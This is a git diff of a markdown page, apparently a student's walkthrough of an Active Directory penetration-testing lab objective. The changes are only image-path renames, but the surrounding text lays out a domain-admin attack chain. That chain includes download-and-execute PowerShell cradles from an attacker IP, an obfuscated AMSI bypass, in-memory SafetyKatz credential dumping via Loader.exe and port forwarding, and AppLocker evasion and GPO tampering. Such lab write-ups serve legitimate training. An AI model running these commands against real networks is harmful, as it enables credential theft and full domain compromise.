@@ -1,6 +1,6 @@
 # Learning Objtetive 7
 
-<figure><img src="../../../.gitbook/assets/image (16) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (115).png" alt=""><figcaption></figcaption></figure>
 
 * dcorp-mgmt - Process using svcadmin as service account
 * dcorp-mgmt - NTLM hash of svcadmin account
@@ -72,11 +72,11 @@ DCORP-APPSRV   dcorp\appadmin   False
 ..snip...
 ```
 
-<figure><img src="../../../.gitbook/assets/image (13) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (49).png" alt=""><figcaption></figcaption></figure>
 
 Sweet! There is a <mark style="background-color:red;">domain admin (svcadmin) session on dcorp-mgmt server</mark>! We do not have access to the server but that comes later.
 
-<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (79).png" alt=""><figcaption></figcaption></figure>
 
 > We can see if this user is domain admin comparing it to BloodHound
 
@@ -105,7 +105,7 @@ Upload the file sbloggingbypass.txt --->
 iex ((New-Object Net.WebClient).DownloadString('http://172.16.100.113/sbloggingbypass.txt'))
 ```
 
-<figure><img src="../../../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (91).png" alt=""><figcaption></figcaption></figure>
 
 ### Bypass AMSI
 
@@ -121,13 +121,13 @@ iex ((New-Object Net.WebClient).DownloadString('http://172.16.100.113/Amsi-Byp.t
 > S`eT-It`em ( 'V'+'aR' +  'IA' + (("{1}{0}"-f'1','blE:')+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),(("{0}{1}" -f '.M','an')+'age'+'men'+'t.'),('u'+'to'+("{0}{2}{1}" -f 'ma','.','tion')),'s',(("{1}{0}"-f 't','Sys')+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+("{0}{1}" -f 'ni','tF')+("{1}{0}"-f 'ile','a'))  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+("{1}{0}" -f'ubl','P')+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
 > ```
 
-<figure><img src="../../../.gitbook/assets/image (6) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (93).png" alt=""><figcaption></figcaption></figure>
 
 ### Execute PowerView
 
 Upload PoweView to execute commnads -->
 
-<figure><img src="../../../.gitbook/assets/image (7) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (94).png" alt=""><figcaption></figcaption></figure>
 
 ```
 iex ((New-Object Net.WebClient).DownloadString('http://172.16.100.113/PowerView.ps1'))
@@ -192,7 +192,7 @@ We would now run SafetyKatz.exe =(versión modificada de Mimikatz que se usa par
 
 > Remember upload SafetyKatz to the webshell
 
-<figure><img src="../../../.gitbook/assets/image (2) (1) (1) (1) (1) (1).png" alt="" width="302"><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (80).png" alt="" width="302"><figcaption></figcaption></figure>
 
 > ```
 > [ Attacker VM ] 172.16.100.113
@@ -235,7 +235,7 @@ We would now run SafetyKatz.exe =(versión modificada de Mimikatz que se usa par
 
 Run the following command on the shell of rever shell (ciadmin\dcorp-ci):
 
-<figure><img src="../../../.gitbook/assets/image (8) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (95).png" alt=""><figcaption></figcaption></figure>
 
 ```
 iwr http://172.16.100.113/Loader.exe -OutFile C:\Users\Public\Loader.exe
@@ -250,7 +250,7 @@ copy C:\Users\Public\Loader.exe \\dcorp-mgmt\C$\Users\Public\Loader.exe
 cmd /c copy C:\Users\Public\Loader.exe \\dcorp-mgmt\C$\Users\Public\Loader.exe
 ```
 
-<figure><img src="../../../.gitbook/assets/image (10) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (97).png" alt=""><figcaption></figcaption></figure>
 
 ### Port Forwarding - Bypass Detections
 
@@ -272,9 +272,9 @@ To run SafetyKatz on dcorp-mgmt, we will download and execute it in-memory using
 $null | winrs -r:dcorp-mgmt "cmd /c C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe sekurlsa::evasive-keys exit"
 ```
 
-<figure><img src="../../../.gitbook/assets/image (11) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (98).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../../../.gitbook/assets/image (4) (1) (1) (1) (1) (1).png" alt="" width="563"><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (81).png" alt="" width="563"><figcaption></figcaption></figure>
 
 Sweet! We got credentials of svcadmin - a domain administrator. Note that svcadmin is used as a service account (see “Session” in the above output), so you can even get credentials in clear-text from lsasecrets!
 
@@ -312,7 +312,7 @@ Now moving on to the next task, we need to escalate to domain admin using deriva
 Find-PSRemotingLocalAdminAccess
 ```
 
-<figure><img src="../../../.gitbook/assets/image (5) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (82).png" alt=""><figcaption></figcaption></figure>
 
 > We have local admin on the dcorp-adminsrv. You will notice that any attempt to run Loader.exe (to run SafetKatz from memory) results in error ‘**This program is blocked by group policy. For more information, contact your system administrator**’. Any attempts to run Invoke-Mimi on dcorp-adminsrv results in errors about language mode. This could be because of an application allowlist on dcorp-adminsrv and we drop into a `Constrained Language Mode (CLM)` when using PSRemoting.
 
@@ -328,7 +328,7 @@ winrs -r:dcorp-adminsrv cmd
 reg query HKLM\Software\Policies\Microsoft\Windows\SRPV2
 ```
 
-<figure><img src="../../../.gitbook/assets/image (6) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (83).png" alt=""><figcaption></figcaption></figure>
 
 Looks like Applocker is configured. After going through the policies, we can understand that Microsoft Signed binaries and scripts are allowed for all the users but nothing else. However, this particular rule is overly permissive!
 
@@ -338,13 +338,13 @@ First search the scripts and examine its at found something -->
 reg query HKLM\Software\Policies\Microsoft\Windows\SRPV2\Script\
 ```
 
-<figure><img src="../../../.gitbook/assets/image (7) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (84).png" alt=""><figcaption></figcaption></figure>
 
 ```
 reg query HKLM\Software\Policies\Microsoft\Windows\SRPV2\Script\06dce67b-934c-454f-a263-2515c8796a5d
 ```
 
-<figure><img src="../../../.gitbook/assets/image (8) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (85).png" alt=""><figcaption></figcaption></figure>
 
 **A default rule is enabled that allows everyone to run scripts from the `C:\Program Files` folder!** We can also confirm this using PowerShell commands on dcrop-adminsrv. Run the below commands from a PowerShell session as studentx:
 
@@ -363,7 +363,7 @@ Now execute this command to read the current enable rules -->
 Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
 ```
 
-<figure><img src="../../../.gitbook/assets/image (9) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (86).png" alt=""><figcaption></figcaption></figure>
 
 Here, `Everyone` can run scripts from the ‘**Program Files**’ directory. That means, we can drop scripts in the Program Files directory there and execute them. Also, in the Constrained Language Mode, we cannot run scripts using dot sourcing (`. .\Invoke-TheKat.ps1`). So, we must modify `Invoke-TheKat.ps1` to include the function call in the script itself and transfer the modified script (Invoke-TheKatEx.ps1) to the target server.
 
@@ -373,7 +373,7 @@ Here, `Everyone` can run scripts from the ‘**Program Files**’ directory. Tha
 * Open `Invoke-TheKatEx-keys-stdX.ps1` in PowerShell ISE (Right click on it and click Edit).
 * Add the below encoded value for `token-evasive-elevate` and `sekurlsa::evasive-ekeys` to the end of the file.
 
-<figure><img src="../../../.gitbook/assets/image (548).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (1420).png" alt=""><figcaption></figcaption></figure>
 
 On student machine run the following command from a PowerShell session.
 
@@ -406,7 +406,7 @@ Now, run the modified mimikatz script.
 .\Invoke-TheKatEx-keys-std113.ps1
 ```
 
-<figure><img src="../../../.gitbook/assets/image (549).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (1421).png" alt=""><figcaption></figcaption></figure>
 
 <mark style="background-color:orange;">Here we find the credentials of the</mark> <mark style="background-color:orange;">`dcorp-adminsrv$`</mark><mark style="background-color:orange;">,</mark> <mark style="background-color:orange;">`appadmin`</mark> <mark style="background-color:orange;">and</mark> <mark style="background-color:orange;">`websvc`</mark> <mark style="background-color:orange;">users.</mark>
 
@@ -428,7 +428,7 @@ Copy-Item C:\AD\Tools\Invoke-TheKatEx-vault-std113.ps1 \\dcorp-adminsrv.dollarco
 
 Now, run the script. Again, it may take a couple of minutes for the script execution to complete:
 
-<figure><img src="../../../.gitbook/assets/image (5) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (67).png" alt=""><figcaption></figcaption></figure>
 
 Sweet! We got credentials for the `srvadmin` user in clear-text!
 
@@ -458,7 +458,7 @@ C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
 Find-PSRemotingLocalAdminAccess -Domain dollarcorp.moneycorp.local -Verbose
 ```
 
-<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (68).png" alt=""><figcaption></figcaption></figure>
 
 We can see how we have local admin access on the `dcorp-mgmt` server as srvadmin and we already know a session of svcadmin is present on that machine.
 
@@ -472,7 +472,7 @@ Copy the Loader.exe to `dcorp-mgmt`:
 echo F | xcopy C:\AD\Tools\Loader.exe \\dcorp-mgmt\C$\Users\Public\Loader.exe
 ```
 
-<figure><img src="../../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (69).png" alt=""><figcaption></figcaption></figure>
 
 Now extract the credentials:
 
@@ -484,7 +484,7 @@ Now extract the credentials:
 winrs -r:dcorp-mgmt C:\Users\Public\Loader.exe -path http://172.16.100.113:80/SafetyKatz.exe "sekurlsa::Evasive-keys" "exit"
 ```
 
-<figure><img src="../../../.gitbook/assets/image (4) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (70).png" alt=""><figcaption></figcaption></figure>
 
 ### Disable Applocker on dcorp-adminsrv by modifying GPO
 
@@ -494,7 +494,7 @@ Let’s make changes to the Group Policy and disable Applocker on dcorp-adminsrv
 
 We need the Group Policy Management Console for this. As the student VM is a Server 2022 machine, we can install it using the following steps: `Open Server Manager -> Add Roles and Features -> Next -> Features -> Check Group Policy Management -> Next -> Install`
 
-<figure><img src="../../../.gitbook/assets/image (5) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (71).png" alt=""><figcaption></figcaption></figure>
 
 After the installation is completed, start the gpmc.
 
@@ -502,7 +502,7 @@ Start the gpmc. We need to start a process as studetntX using runas, otherwise g
 
 Run the below command from an elevated shell:
 
-<figure><img src="../../../.gitbook/assets/image (6) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (72).png" alt=""><figcaption></figcaption></figure>
 
 <pre><code><strong>PS C:\Users\student113> runas /user:dcorp\studentx /netonly cmd
 </strong></code></pre>
@@ -515,11 +515,11 @@ PS C:\Users\student113> gpmc.msc
 
 > In gpmc, expand `Forest -> Domains -> dollarcorp.moneycorp.local -> Applocked -> Right click on the Applocker policy` and click on Edit
 
-<figure><img src="../../../.gitbook/assets/image (7) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (73).png" alt=""><figcaption></figcaption></figure>
 
 > In the new window, `Expand Policies -> Windows Settings -> Security Settings -> Application Control Policies -> Applocker`
 
-<figure><img src="../../../.gitbook/assets/image (8) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (74).png" alt=""><figcaption></figcaption></figure>
 
 Start looking at each category of the Applocker policies. You will find out that there are two restrictions.
 
@@ -530,7 +530,7 @@ Start looking at each category of the Applocker policies. You will find out that
 
 As we already abused the default rules for Scripts, let’s go for Executable Rules. Right Click on the rule and delete it.
 
-<figure><img src="../../../.gitbook/assets/image (9) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (75).png" alt=""><figcaption></figcaption></figure>
 
 > Now, we can either wait for the Group Policy refresh or force an update on the dcorp-adminsrv machine.
 
@@ -542,7 +542,7 @@ winrs -r:dcorp-adminsrv cmd
 gpupdate /force
 ```
 
-<figure><img src="../../../.gitbook/assets/image (10) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (76).png" alt=""><figcaption></figcaption></figure>
 
 Exit of the current session and copy Loader on the machine and use it to run SafetyKatz!!!
 
@@ -563,7 +563,7 @@ Then of it, execute -->
 C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -args "sekurlsa::evasive-keys" "exit"
 ```
 
-<figure><img src="../../../.gitbook/assets/image (11) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (77).png" alt=""><figcaption></figcaption></figure>
 
 Sweet! We were able to disable Applocker.
 
